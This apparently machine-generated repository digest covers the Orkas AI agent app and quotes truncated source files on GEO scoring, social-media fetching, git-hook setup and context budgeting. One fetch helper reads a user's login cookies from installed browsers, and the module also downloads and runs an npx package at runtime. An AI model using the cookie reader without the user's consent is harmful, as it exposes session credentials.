# Forensic Learning Record (Deep Inspection): Orkas-AI/Orkas

> **Canonical Artifact**: `07_PROJECT_LEARNING/orkas-ai-orkas-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/Orkas-AI/Orkas](https://github.com/Orkas-AI/Orkas))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-10-06T04:11:20.271Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `Orkas-AI/Orkas`
- **Description**: Orkas is an open-source, local-first AI desktop app: a commander LLM directs specialist sub-agents, and runs your installed coding CLIs — Claude Code, Codex, OpenCode, OpenClaw, Hermes — as local sessions. Agents self-evolve via reflection and skill crystallization. BYO keys. macOS / Windows / Linux.
- **Primary Language / Ecosystem**: JavaScript
- **Discovered Manifests / Configurations**: package.json, README.md
- **Stars / Engagement**: 2152 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: package.json, README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `resources/builtin/marketplace/agents/e064dca9e1bd/skills/geo-score/scripts/geo_score.py`
```
"""geo-score — platform-agnostic GEO (Generative Engine Optimization) score.

stdlib only. Pure-function core (`score_geo`) over the seo-crawl page. Produces
a 5-dimension weighted GEO score, an entity-resolution status, and ranked
recommendations — kept SEPARATE from the SEO health score (the design plan
treats GEO as its own facet). No network.

Dimensions (weights): Citability 25 · Structure 20 · Multimodal 15 ·
Authority&Brand 20 · Technical-access 20. Signals are crawl facts (answer-first,
heading hierarchy, alt coverage, JSON-LD Organization+sameAs, indexability,
HTTPS, raw-HTML content, AI-crawler reachability via robots.txt).
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from urllib.parse import urlsplit

_WEIGHTS = {"citability": 0.25, "structure": 0.20, "multimodal": 0.15,
            "authority": 0.20, "technical": 0.20}
_AI_BOTS = ("GPTBot", "OAI-SearchBot", "ChatGPT-User", "ClaudeBot", "Claude-SearchBot",
            "Claude-User", "PerplexityBot", "Perplexity-User", "Google-Extended", "CCBot")
# robots.txt UA tokens are case-insensitive; map casefolded -> canonical name.
_AI_BOTS_CF = {b.casefold(): b for b in _AI_BOTS}


def _data_page(crawl_obj: dict) -> tuple[dict, dict]:
    data = crawl_obj.get("data", crawl_obj) if isinstance(crawl_obj, dict) else {}
    pages = data.get("pages") or []
    if not pages:
        raise ValueError("crawl JSON has no pages")
    return pages[0], (data.get("site") or {})


def _sd_nodes(structured_data):
    out = []
    for block in structured_data or []:
        items = block if isinstance(block, list) else [block]
        for it in items:
            if isinstance(it, dict):
                if isinstance(it.get("@graph"), list):
                    out.extend(n for n in it["@graph"] if isinstance(n, dict))
                else:
                    out.append(it)
    return out


def _with_nested(nodes: list) -> list:
    """Each node plus its one-level-nested dict values and list-of-dict items,
    so `Article -> publisher: {@type: Organization}` is scanned too. One level
    covers the common publisher/author/brand nesting; non-dict values (e.g.
    `publisher: "name"`) are ignored."""
    out = list(nodes)
    for n in nodes:
        for v in n.values():
            if isinstance(v, dict):
                out.append(v)
            elif isinstance(v, list):
                out.extend(x for x in v if isinstance(x, dict))
    return out


def _node_types(node: dict) -> list[str]:
    t = node.get("@type")
    if isinstance(t, list):
        return [str(x) for x in t]
    return [str(t)] if t else []


def _robots_blocks_ai(robots_text: str) -> list[str]:
    """Return the AI/crawler user-agents that robots.txt disallows at root.
    Light parser: track the current User-agent group (case-insensitive names)
    and any root disallow ('Disallow: /' or its wildcard form 'Disallow: /*')."""
    blocked = []
    if not robots_text:
        return blocked
    cur = []
    prev_was_ua = False
    for raw in robots_text.splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        k, _, v = line.partition(":")
        k = k.strip().lower(); v = v.strip()
        if k == "user-agent":
            # Consecutive User-agent lines share one group; a User-agent that
            # follows a rule line starts a new group. Resetting on every line
            # dropped all but the last agent of a stacked group.
            if not prev_was_ua:
                cur = []
            cur.append(v)
            prev_was_ua = True
            continue
        prev_was_ua = False
        if k == "disallow" and v in ("/", "/*"):
            for ua in cur:
                if ua == "*":
                    blocked.append(ua)
                else:
                    canon = _AI_BOTS_CF.get(ua.casefold())
                    if canon:
                        blocked.append(canon)
    return sorted(set(blocked))


def score_geo(crawl_obj: dict) -> dict:
    page, site = _data_page(crawl_obj)
    dims = {k: 100 for k in _WEIGHTS}
    recs: list[dict] = []

    def deduct(dim, amount, title, evidence, rec, lead, fail, tier="Measured"):
        dims[dim] = max(0, dims[dim] - amount)
        recs.append({"dimension": "geo:" + dim, "title": title, "evidence": evidence,
                     "recommendation": rec, "leading_indicator": lead,
                     "failure_criterion": fail, "data_tier": tier})

    first = (page.get("first_paragraph") or "").strip()
    wc = page.get("word_count", 0)
    # ── Citability ──
    if len(first) < 60:
        deduct("citability", 40, "No extractable answer up top",
               "opening paragraph {} chars".format(len(first)),
               "Open with a 1–2 sentence direct answer in the first 30% (answer-first).",
               "opening carries a quotable direct answer", "answer still buried", tier="Estimated")
    if wc and wc < 300:
        deduct("citability", 20, "Thin body weakens citability",
               "{} words".format(wc), "Add substantive, original, quotable content.",
               "word count grows with quotable facts", "still thin")

    # ── Structure ──
    if page.get("h1_count", 0) != 1:
        deduct("structure", 30, "Heading structure unclear",
               "{} H1 elements".format(page.get("h1_count", 0)),
               "Use exactly one H1 and a logical H2/H3 outline so engines can segment answers.",
               "single H1 + clean outline on recrawl", "structure still unclear")
    order = page.get("heading_order") or []
    prev = 0
    for lvl in order:
        if prev and lvl - prev > 1:
            deduct("structure", 20, "Heading levels skip", "order {}".format(order),
                   "Don't jump heading levels; keep a parseable hierarchy.",
                   "no level jumps on recrawl", "still skipping")
            break
        prev = lvl
    if not any(l == 2 for l in order):
        deduct("structure", 20, "No H2 sub-sections",
               "no H2 headings", "Break the page into H2 sub-sections that map to sub-questions.",
               "H2 sections present", "still a flat page")

    # ── Multimodal ──
    if page.get("images_total", 0) == 0:
        deduct("multimodal", 30, "No images/diagrams",
               "0 images", "Add relevant diagrams/screenshots with descriptive alt (multimodal citation).",
               "captioned visuals present", "still text-only", tier="Estimated")
    if page.get("images_missing_alt", 0) > 0:
        deduct("multimodal", 30, "Images missing alt text",
               "{} images lack alt".format(page.get("images_missing_alt")),
               "Add descriptive alt so engines can read the visuals.",
               "alt coverage 100%", "alt still missing")

    # ── Authority & brand (entity resolution) ──
    nodes = _with_nested(_sd_nodes(page.get("structured_data")))
    types = page.get("structured_data_types") or []
    # structured_data_types only lists top-level/@graph types, so also scan the
    # (nested-inclusive) nodes: a publisher-nested Organization counts.
    has_org = "Organization" in types or any("Organization" in _node_types(n) for n in nodes)
    has_sameas = any(n.get("sameAs") for n in nodes)
    if not has_org:
        deduct("authority", 30, "No Organization entity",
               "no Organization JSON-LD", "Add Organization JSON-LD so the brand is a resolvable entity.",
               "Organization present + recognized", "brand still unresolved")
    if not has_sameas:
        deduct("authority", 20, "No sameAs brand links",
               "no sameAs in JSON-LD",
               "Add sameAs links (Wikidata/Wikipedia/Crunchbase/GitHub/social) to resolve the entity.",
               "sameAs present; entity recognized in Knowledge Graph", "entity still ambiguous", tier="Estimated")
    if page.get("external_link_count", 0) == 0:
        deduct("authority", 20, "No outbound citations",
               "0 external links", "Cite authoritative sources; corroboration raises citability.",
               "outbound citations present", "still no citations")
    entity_status = "recognized" if (has_org and has_sameas) else "partial" if has_org else "unrecognized"

    # ── Technical access ──
    # None means no request was made, so neither fact is known. Deducting would
    # invent a defect and skipping silently would score the dimension as clean,
    # so the unknown is recorded and the dimension goes unscored below.
    not_assessed: list[dict] = []
    local_only = "no request was made (local file crawl)"
    if page.get("is_indexable") is None:
        not_assessed.append({"dimension": "technical", "check": "is_indexable", "reason": local_only})
    elif not page.get("is_indexable"):
        deduct("technical", 50, "Page not indexable",
               "is_indexable=false", "Make the page indexable (200 + no noindex); unindexable pages aren't cited.",
               "page indexable on recrawl", "still blocked")
    if page.get("https") is None:
        not_assessed.append({"dimension": "technical", "check": "https", "reason": local_only})
    elif not page.get("https"):
        deduct("technical", 20, "Not HTTPS", "scheme http", "Serve over HTTPS.",
               "https on recrawl", "still http")
    if wc == 0:
        deduct("technical", 30, "No content in raw HTML",
               "0 words in static fetch",
               "Server-render the citation-critical content; AI crawlers read raw HTML, not JS.",
               "content present in raw HTML", "still JS-only", tier="Estimated")
    blocked = _robots_blocks_ai(site.get("robots", {}).get("text", ""))
    if blocked:
        deduct("technical", 20, "robots.txt blocks AI crawlers",
               "Disallow / for {}".format(", ".join(blocked)),
               "Allow AI-search crawlers (or specific bots) in robots.txt if you want citations.",
               "AI bots allowed on recrawl", "still disallowed")

    geo_scor
```

### Core Architecture Module: `resources/builtin/marketplace/skills/e7f5c0e6f1be/scripts/social_fetch_core.py`
```
#!/usr/bin/env python3
"""Per-platform fetch primitives shared by `fetch.py`.

Pinned Python dependencies are bootstrapped by `run-skill.cjs` from the
skill-root requirements.fetch.txt. Twitter uses an installed `xreach` binary
when available, otherwise the bundled Node/npm runtime downloads the pinned
CLI through npx. Xiaohongshu still requires its separate local proxy.
"""
import hashlib, json, os, re, shutil, subprocess, sys, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# `requests` is a third-party dependency; in a stdlib-only sandbox a bare
# import would kill the whole module (even for fetchers that never touch it)
# with a raw traceback instead of the documented {"ok": false, ...} envelope.
# Guard it like browser_cookie3/curl_cffi below and fail per-fetcher instead.
try:
    import requests
except ImportError:
    requests = None


class MissingDependencyError(RuntimeError):
    """A required third-party package is not installed in this environment."""


def _require_requests(feature):
    """Fail fast with a clear, JSON-envelope-friendly error when `requests`
    is unavailable. Every `requests.` use in this module lives inside a
    fetcher whose entrypoint calls this guard first (fetch_xhs, fetch_reddit,
    and fetch_bilibili's no-curl_cffi fallback), so `requests` can never be
    dereferenced as None."""
    if requests is None:
        raise MissingDependencyError(
            f"missing dependency: the 'requests' package is required for {feature}. "
            "Install it with: pip install requests"
        )


try:
    import browser_cookie3
    _BROWSER_COOKIE3_OK = True
except ImportError:
    _BROWSER_COOKIE3_OK = False

try:
    from curl_cffi import requests as curl_cffi_requests
    _CURL_CFFI_OK = True
except ImportError:
    _CURL_CFFI_OK = False

XHS_BASE = 'http://localhost:18060'
XHS_REQUEST_TIMEOUT = 70   # Slightly above the server's internal 60s timeout, so we get a 500 instead of context-canceled
XHS_DETAIL_WORKERS = 4     # Number of threads used to fetch detail concurrently
DEFAULT_YOUTUBE_META_COUNT = 8
DEFAULT_YOUTUBE_META_WORKERS = 4

# Browsers that browser_cookie3 can read from. Order = priority — first browser
# that yields cookies for the requested domain wins. Override with the
# SOCIAL_FETCH_BROWSERS env var (comma-separated) when needed.
_DEFAULT_BROWSERS = ('chrome', 'firefox', 'edge', 'safari', 'brave', 'chromium')


def _load_cookies_for_domain(domain_name: str, allowed: bool = False) -> dict:
    """Read cookies for `domain_name` from any installed browser.

    Tries each browser in `_DEFAULT_BROWSERS` order (or the env override) and
    returns the first non-empty cookie set. Returns {} if browser_cookie3 is
    not installed or no browser yielded cookies.
    """
    if not allowed or not _BROWSER_COOKIE3_OK:
        return {}

    override = os.environ.get('SOCIAL_FETCH_BROWSERS', '').strip()
    if override:
        browsers = tuple(b.strip() for b in override.split(',') if b.strip())
    else:
        browsers = _DEFAULT_BROWSERS

    for name in browsers:
        loader = getattr(browser_cookie3, name, None)
        if not callable(loader):
            continue
        try:
            cj = loader(domain_name=domain_name)
            cookies = {c.name: c.value for c in cj}
            if cookies:
                return cookies
        except Exception:
            continue
    return {}


def _get_reddit_cookies(allowed: bool = False):
    return _load_cookies_for_domain('.reddit.com', allowed=allowed)


def _get_bilibili_cookies(allowed: bool = False):
    return _load_cookies_for_domain('.bilibili.com', allowed=allowed)


# ── Bilibili Wbi signature (required since 2023) ──────────────────────

_WBI_MIXIN_KEY_ENC_TAB = [
    46, 47, 18, 2, 53, 8, 23, 32, 15, 50, 10, 31, 58, 3, 45, 35,
    27, 43, 5, 49, 33, 9, 42, 19, 29, 28, 14, 39, 12, 38, 41, 13,
    37, 48, 7, 16, 24, 55, 40, 61, 26, 17, 0, 1, 60, 51, 30, 4,
    22, 25, 54, 21, 56, 59, 6, 63, 57, 62, 11, 36, 20, 34, 44, 52
]

def _wbi_get_mixin_key(orig: str) -> str:
    return ''.join(orig[i] for i in _WBI_MIXIN_KEY_ENC_TAB)[:32]

def _wbi_sign_params(params: dict, img_key: str, sub_key: str) -> dict:
    mixin = _wbi_get_mixin_key(img_key + sub_key)
    params['wts'] = int(time.time())
    q = urllib.parse.urlencode(sorted(params.items(), key=lambda x: x[0]))
    params['w_rid'] = hashlib.md5((q + mixin).encode()).hexdigest()
    return params

def _bilibili_fetch_wbi_keys(session, headers, cookies, timeout=15):
    try:
        nav = session.get(
            'https://api.bilibili.com/x/web-interface/nav',
            headers=headers, cookies=cookies, timeout=timeout,
        )
        nav.encoding = 'utf-8'
        nav_data = nav.json()
        wbi = nav_data.get('data', {}).get('wbi_img', {})
        img = (wbi.get('img_url', '') or '').rsplit('/', 1)[-1].split('.')[0]
        sub = (wbi.get('sub_url', '') or '').rsplit('/', 1)[-1].split('.')[0]
        if img and sub:
            return img, sub
    except Exception:
        pass
    return None, None


def log(msg):
    ts = datetime.now().strftime('%H:%M:%S')
    print(f'[{ts}] {msg}', flush=True)


def to_int(v):
    try:
        return int(str(v).replace(',', ''))
    except Exception:
        return 0


def make_diag(name):
    return {
        'platform': name,
        'status': 'ok',
        'reason': '',
        'raw_hits': 0,
        'deduped': 0,
        'selected': 0,
        'failed': 0,
        'errors': [],
        'details': [],
    }


def add_diag(diag, **kwargs):
    for k, v in kwargs.items():
        if k == 'errors' and v:
            diag.setdefault('errors', []).append(v)
        elif k == 'detail' and v:
            diag.setdefault('details', []).append(v)
        else:
            diag[k] = v


_XREACH_NPX_PACKAGE = 'xreach-cli@0.3.3'


def _npx_cmd():
    """Return a cross-platform npx command backed by Orkas' bundled Node."""
    node = os.environ.get('ORKAS_BUNDLED_NODE', '').strip()
    if node:
        node_dir = os.path.dirname(node)
        candidates = (
            os.path.join(node_dir, 'node_modules', 'npm', 'bin', 'npx-cli.js'),
            os.path.join(node_dir, '..', 'lib', 'node_modules', 'npm', 'bin', 'npx-cli.js'),
        )
        for cli in candidates:
            cli = os.path.abspath(cli)
            if os.path.isfile(cli):
                return [node, cli]
    npx = shutil.which('npx')
    return [npx] if npx else []


def xreach_cmd(keyword, count=30):
    installed = shutil.which('xreach')
    if installed:
        return [installed, 'search', keyword, '--json', '-n', str(count)]
    npx = _npx_cmd()
    if npx:
        return [*npx, '--yes', _XREACH_NPX_PACKAGE, 'search', keyword, '--json', '-n', str(count)]
    return ['xreach', 'search', keyword, '--json', '-n', str(count)]


def yt_dlp_cmd(*args):
    bin_path = shutil.which('yt-dlp')
    if bin_path:
        return [bin_path, *args]
    return [sys.executable, '-m', 'yt_dlp', *args]


def _yt_dlp_search(prefix, kw, limit=8, browser_cookies=None):
    q = f'{prefix}{limit}:{kw}'
    cmd = yt_dlp_cmd(q, '--dump-single-json', '--skip-download', '--flat-playlist')
    if browser_cookies:
        cmd = yt_dlp_cmd('--cookies-from-browser', browser_cookies, q, '--dump-single-json', '--skip-download', '--flat-playlist')
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        if r.returncode != 0 or not r.stdout.strip():
            return []
        data = json.loads(r.stdout)
        return data.get('entries', []) or []
    except Exception:
        return []


def _yt_dlp_meta(url):
    try:
        r = subprocess.run(yt_dlp_cmd(url, '--dump-json', '--skip-download'), capture_output=True, text=True, timeout=90)
        if r.returncode != 0 or not r.stdout.strip():
            return {}
        return json.loads(r.stdout.strip().splitlines()[-1])
    except Exception:
        return {}


def _twitter_fetch_comments(tweet_url):
    try:
        result = subprocess.run(
            ['xreach', 'thread', tweet_url, '--json'],
            capture_output=True, text=True, timeout=90,
        )
        if result.returncode != 0 or not result.stdout.strip():
            return []
        data = json.loads(result.stdout)
        items = data.get('items', [])
        replies = items[1:] if len(items) > 1 else []
        return [
            {'user': r.get('username', ''), 'text': r.get('text', '')}
            for r in replies
            if r.get('text')
        ]
    except Exception:
        return []


def _youtube_fetch_comments(url):
    try:
        r = subprocess.run(
            yt_dlp_cmd('--write-comments', '--dump-json', '--skip-download', url),
            capture_output=True, text=True, timeout=120,
        )
        if r.returncode != 0 or not r.stdout.strip():
            return []
        data = json.loads(r.stdout.strip().splitlines()[-1])
        comments = data.get('comments', []) or []
        return [
            {'user': c.get('author', ''), 'text': c.get('text', '')}
            for c in comments
            if c.get('text')
        ]
    except Exception:
        return []


# Xiaohongshu enum values are Chinese strings sent verbatim to the upstream
# local proxy server — do not translate.
_XHS_VALID_PUBLISH_TIMES = {'一天内', '一周内', '半年内', '不限'}
_XHS_VALID_SORTS = {'最新', '最热'}

def fetch_xhs(config):
    _require_requests('the Xiaohongshu fetcher')
    log('🔴 Fetching Xiaohongshu...')
    diag = make_diag('Xiaohongshu')
    seen, notes = set(), []

    publish_time = config.get('xhs_publish_time', '半年内')
    if publish_time not in _XHS_VALID_PUBLISH_TIMES:
        log(f'  ⚠️  xhs_publish_time="{publish_time}" is not a valid enum, falling back to "半年内" (valid: {sorted(_XHS_VALID_PUBLISH_TIMES)})')
        publish_time = '半年内'

    xhs_sort = config.get('xhs_sort', '最新')
    if xhs_sort not in _XHS_VALID_SORTS:
        log(f'  ⚠️  
```

### Core Architecture Module: `scripts/install-git-hooks.mjs`
```
#!/usr/bin/env node
/**
 * Auto-install the repo-local git hooks directory.
 *
 * Wired into PC/package.json `prepare`, which `npm install` runs whenever
 * a contributor sets up the repo. Effect:
 *
 *   git config core.hooksPath <repo-root>/.githooks
 *
 * so the commit-msg hook (the one that enforces `Prompt audit:` on
 * prompt-facing commits) is on by default — no per-machine ceremony.
 *
 * Best-effort: silently no-ops when
 *   - cwd isn't inside a git checkout (e.g. tarball install)
 *   - the .githooks/ directory isn't present
 *   - `git` isn't on PATH
 * so a botched local setup never blocks `npm install`.
 */

import { execFileSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';

export function tryGitTopLevel({
  cwd = process.cwd(),
  execFile = execFileSync,
} = {}) {
  try {
    return execFile('git', ['rev-parse', '--show-toplevel'], {
      cwd,
      stdio: ['ignore', 'pipe', 'ignore'],
    })
      .toString()
      .trim();
  } catch {
    return null;
  }
}

export function installGitHooks({
  cwd = process.cwd(),
  execFile = execFileSync,
  fileSystem = fs,
  log = console.log,
  warn = console.warn,
} = {}) {
  const repoRoot = tryGitTopLevel({ cwd, execFile });
  if (!repoRoot) {
    // Not a git checkout — npm install from a published tarball, CI install
    // with .git stripped, etc. Silently no-op.
    return { status: 'no_repository' };
  }

  const hooksDir = path.join(repoRoot, '.githooks');
  if (!fileSystem.existsSync(hooksDir)) {
    // No hooks vendored in this checkout — nothing to wire up.
    return { status: 'no_hooks', repoRoot, hooksDir };
  }

  try {
    execFile('git', ['config', 'core.hooksPath', hooksDir], {
      cwd: repoRoot,
      stdio: 'ignore',
    });
    log('[install-git-hooks] repository hooks configured');
    return { status: 'installed', repoRoot, hooksDir };
  } catch {
    warn('[install-git-hooks] skipped: git config failed');
    return { status: 'config_failed', repoRoot, hooksDir };
  }
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  installGitHooks();
}

```

### Core Architecture Module: `src/core-agent/src/agent/context-budget.ts`
```
/**
 * Active-process compaction budgets derived from usable request room after
 * measured prompt/tool overhead and resident state. Completed conversation
 * history independently uses five turns and min(30K tokens, 20% of turn-start room).
 *
 * Reserve one sixth of room for growth between checks; this is planning room,
 * not a tool-result admission cap. Preserve the active checkpoint's existing
 * 60% sizing share and allow its trigger to borrow unused room from the other
 * 40% after subtracting measured history occupancy. There is no historical
 * compression trigger. Retained-tail and summary sizes use the base active
 * share, so borrowing does not enlarge an individual fold without a bound.
 *
 * Pure arithmetic — no Session, runner or I/O.
 */

/** Historical compaction reserve floor, reduced on small windows. This is
 * not a per-round result-admission ceiling. */
export const TOOL_RESULT_RESERVE_FLOOR_TOKENS = 16_000;

/** Prompt-level target for one compaction summary at the smallest budget
 *  (also the floor the derived target never goes below). It is deliberately
 *  not sent as a provider output limit: reasoning-capable models must be
 *  allowed to finish reasoning and produce final text before the Host bounds
 *  storage. */
export const CONTEXT_COMPACTION_SUMMARY_PREFERRED_MAX_TOKENS = 1_200;
/** Host-side storage ceiling for one summary at the floor target. */
export const CONTEXT_COMPACTION_SUMMARY_HARD_TOKENS = 2_000;
/** The summary target grows with the active trigger: a fixed 1,200-token
 *  summary standing in for 270K of folded process gives each fact a fifth of
 *  the room it had at 60K, and every lost fact is a re-read. Two percent of
 *  the trigger keeps the floor on every window the old constants served
 *  (a 45K trigger still yields 1,200) and rises to the ceiling on 1M windows;
 *  the storage bound keeps its historical 5:3 ratio to the target. */
const SUMMARY_TARGET_SHARE_OF_ACTIVE = 0.02;
const SUMMARY_TARGET_MAX_TOKENS = 6_000;
const SUMMARY_HARD_MULTIPLE = CONTEXT_COMPACTION_SUMMARY_HARD_TOKENS / CONTEXT_COMPACTION_SUMMARY_PREFERRED_MAX_TOKENS;

/** Compatibility anchor for unknown-model active-process budgeting. */
const DEFAULT_BUDGET_ROOM_TOKENS = 36_000;

/** Below this much room the layered triggers cannot do useful work: the
 *  active trigger would hold fewer than four summaries' worth, so a checkpoint
 *  has little room for a useful retained tail. Such a window runs on the
 *  emergency layer alone (triggers parked at the window, see
 *  `windowTooSmall`) instead of thrashing summarization calls. */
const MIN_LAYERED_ROOM_TOKENS = CONTEXT_COMPACTION_SUMMARY_PREFERRED_MAX_TOKENS * 8;

/** Leave growth room between compaction checks without capping a batch at
 * this share. Small-window reserve floors reduce compaction planning room. */
const INLINE_ROOM_SHARE = 1 / 6;
const ACTIVE_TRIGGER_SHARE_OF_REST = 0.6;
const HISTORY_ROOM_SHARE_OF_REST = 0.4;

/** Derived from the trigger, preserving the historical proportions. */
const ACTIVE_RETAIN_SHARE = 0.45;
const ACTIVE_SINGLE_STEP_SHARE = 0.5;
/** Fixed payload limit for one active checkpoint, including the existing
 *  summary. The runner also clamps it to the compactor's framed capacity.
 *  Complete groups that do not fit remain raw for a later batch. */
export const MAX_ACTIVE_CHECKPOINT_INPUT_TOKENS = 150_000;

/** Fixed per-result admission limits, independent of model window and raw-tail
 *  retention. The round ledger still enforces available request headroom.
 *  The ordinary limit matches the synchronous host policy's default;
 *  Skill documents get room for a complete read without admitting large dumps. */
export const MAX_PER_RESULT_INLINE_TOKENS = 10_000;
export const MAX_VERBATIM_DOCUMENT_INLINE_TOKENS = 25_000;

export type ContextBudget = {
  /** Effective active-turn trigger: the fixed share plus the room the history
   *  layer is not occupying (`activeBorrowedTokens`). */
  activeProcessTrigger: number;
  /** Part of `activeProcessTrigger` borrowed from the history layer's unused
   *  room; zero when history occupancy is unknown or the layer is full. */
  activeBorrowedTokens: number;
  activeRetainTokens: number;
  activeSingleStepMaxTokens: number;
  /** Planning reserve for compaction triggers, never a result admission cap. */
  toolResultReserveTokens: number;
  /** Prompt-level size one compaction summary is asked to stay under. */
  summaryTargetTokens: number;
  /** Host-side storage ceiling for one summary produced under this budget. */
  summaryHardTokens: number;
  /** Ceiling minus measured fixed overhead and resident state: what the
   *  three layered allowances were divided out of. Logged. */
  layeredRoomTokens: number;
  /** The measured non-foldable state this budget accounted for. Logged. */
  residentStateTokens: number;
  /** The room is too small for layered compaction to do useful work; the
   *  triggers are parked at the window so only the emergency layer acts. */
  windowTooSmall: boolean;
};

function deriveContextBudget(
  room: number,
  usable: number,
  residentState: number,
  historyOccupancy?: number,
): ContextBudget {
  const windowTooSmall = room < MIN_LAYERED_ROOM_TOKENS;
  const inlineFloor = Math.min(TOOL_RESULT_RESERVE_FLOOR_TOKENS, Math.floor(usable * 0.1));
  const toolResultReserveTokens = Math.max(inlineFloor, windowTooSmall ? 0 : Math.round(room * INLINE_ROOM_SHARE));
  const rest = Math.max(0, room - toolResultReserveTokens);
  const activeShare = Math.round(rest * ACTIVE_TRIGGER_SHARE_OF_REST);
  const historyRoom = windowTooSmall ? usable : Math.round(rest * HISTORY_ROOM_SHARE_OF_REST);
  // The history layer's unused room goes to the active turn. Occupancy is in
  // the trigger comparison's units (already calibrated by the caller); an
  // unknown occupancy borrows nothing, so budgets built without a session keep
  // the fixed split.
  const occupancy = historyOccupancy === undefined ? undefined : Math.max(0, Math.trunc(historyOccupancy) || 0);
  const activeBorrowedTokens = windowTooSmall || occupancy === undefined ? 0 : Math.max(0, historyRoom - occupancy);
  const activeProcessTrigger = windowTooSmall ? usable : activeShare + activeBorrowedTokens;
  // Everything below describes one fold and stays on the fixed share.
  const activeRetainTokens = Math.round(activeShare * ACTIVE_RETAIN_SHARE);
  const summaryTargetTokens = Math.min(
    SUMMARY_TARGET_MAX_TOKENS,
    Math.max(CONTEXT_COMPACTION_SUMMARY_PREFERRED_MAX_TOKENS, Math.round(activeShare * SUMMARY_TARGET_SHARE_OF_ACTIVE)),
  );
  return {
    activeProcessTrigger,
    activeBorrowedTokens,
    activeRetainTokens,
    activeSingleStepMaxTokens: Math.floor(activeRetainTokens * ACTIVE_SINGLE_STEP_SHARE),
    toolResultReserveTokens,
    summaryTargetTokens,
    summaryHardTokens: Math.round(summaryTargetTokens * SUMMARY_HARD_MULTIPLE),
    layeredRoomTokens: room,
    residentStateTokens: residentState,
    windowTooSmall,
  };
}

/** Unknown-model compaction keeps the 18K active trigger
 * and 16K planning reserve. These are compatibility values, not a second
 * request-capacity limit; the runner derives admission from its resolved (or
 * fallback) usable window and measured/estimated current request size. */
export const DEFAULT_CONTEXT_BUDGET: ContextBudget = Object.freeze({
  ...deriveContextBudget(DEFAULT_BUDGET_ROOM_TOKENS, 60_000, 0),
  toolResultReserveTokens: TOOL_RESULT_RESERVE_FLOOR_TOKENS,
});

/**
 * Derive every compaction threshold from the room the request has.
 *
 * Returns the anchor defaults when the window is unknown or unusable, so a
 * caller that cannot resolve a model never silently gets a degenerate budget.
 */
export function contextBudget(input: {
  usableInputTokens: number;
  /** The request ceiling the runtime enforces (usable input after the
   *  estimator margin); the runner owns that margin. */
  requestCeilingTokens: number;
  fixedOverheadTokens: number;
  /** Measured non-foldable state already in the request: the active user
   *  message, injected ledgers, plan anchor and existing summaries. */
  residentStateTokens?: number;
  /** Completed history occupancy in calibrated estimated tokens. Used only
   *  to derive active-process borrowing, never to trigger history compression. */
  historyOccupancyTokens?: number;
}): ContextBudget {
  const usable = Math.trunc(input.usableInputTokens) || 0;
  if (!Number.isFinite(usable) || usable <= 0) return DEFAULT_CONTEXT_BUDGET;
  const ceiling = Math.max(0, Math.trunc(input.requestCeilingTokens) || 0);
  const overhead = Math.max(0, Math.trunc(input.fixedOverheadTokens) || 0);
  const resident = Math.max(0, Math.trunc(input.residentStateTokens ?? 0) || 0);
  const room = Math.max(0, ceiling - overhead - resident);
  const occupancy = Number.isFinite(input.historyOccupancyTokens as number) ? (input.historyOccupancyTokens as number) : undefined;
  return deriveContextBudget(room, usable, resident, occupancy);
}

```

### Core Architecture Module: `src/core-agent/src/agent/index.ts`
```
export { AgentRunner } from "./runner.js";
export type {
  ReflectionModelCallEvent,
  ReflectionFailure,
} from "./runner.js";
export { Session } from "./session.js";
export { PersistentSession } from "./persistent-session.js";
export { discoverRepositoryInstructions, repositoryInstructionsText } from "./repository-instructions.js";
export type { ToolProtocolRepairReport } from "./persistent-session.js";
export type {
  CompletedWorkEntry,
  CompletedWorkInput,
  CompletedWorkStatus,
  ExecutionPlanAuditRecord,
  ExecutionPlanState,
  ExecutionPlanStep,
  ExecutionPlanStepStatus,
  ExecutionPlanUpdate,
  HistoryResource,
  HistoryResourceKind,
  ToolSurfaceState,
} from "./session.js";
export type { RepositoryInstructionFile, RepositoryInstructions } from "./repository-instructions.js";
export {
  appendWorkspaceObservations,
  cloneWorkspaceObservationState,
  emptyWorkspaceObservationState,
  normalizeWorkspaceObservationState,
  renderWorkspaceDiff,
} from "./workspace-state.js";
export type {
  WorkspaceDiffRequest,
  WorkspaceCompactedState,
  WorkspaceObservationEntry,
  WorkspaceObservationState,
} from "./workspace-state.js";
export type {
  AgentRunParams,
  AgentRunResult,
  AgentRunMeta,
  AgentRunTimings,
  AgentRunConvergenceSignal,
  AgentRunTermination,
  AgentRunEvent,
  AgentRunSteerInput,
  AgentRunSteerMessage,
} from "./types.js";

```

### Core Architecture Module: `src/core-agent/src/agent/loop-guards.ts`
```
import { createHash } from "node:crypto";
import type { ToolReadContinuation } from "../tools/base.js";

/**
 * Run-scoped spin guards for the agent loop, extracted from `runWithProvider`
 * so the counters, thresholds, and verdicts live in one place and can be
 * exercised without a provider. Two deliberately different mechanisms:
 *
 * 1) Repeat detection — a runaway agent proposes the SAME call over and over.
 *    Exact completed-evidence tier: nudge after LOOP_WARN unchanged rounds,
 *    then stop after two further unchanged rounds following delivered feedback. Near-duplicate tier
 *    (identical modulo volatile request-tracking keys): WARN-only by design —
 *    normalized matching is fuzzier, so a false positive must stay a benign
 *    one-time nudge, never a stop (71d4552bf; the silently added hard stop was
 *    removed 2026-08-12 and is pinned WARN-only by agent-runner tests).
 *
 * 2) Progress governor — a model can spin without ever repeating itself by
 *    varying filenames, cursors, or search terms. Each round is classified by
 *    observed outcomes. Proven unchanged results get a stalled-work advisory;
 *    extended exploration gets a separate investigation reminder. Unknown
 *    outcomes and coordination skip the stall counter. Neither advisory
 *    proves that the task is stuck or gains termination authority.
 *
 * The class owns counting and verdicts ONLY. The loop keeps ownership of
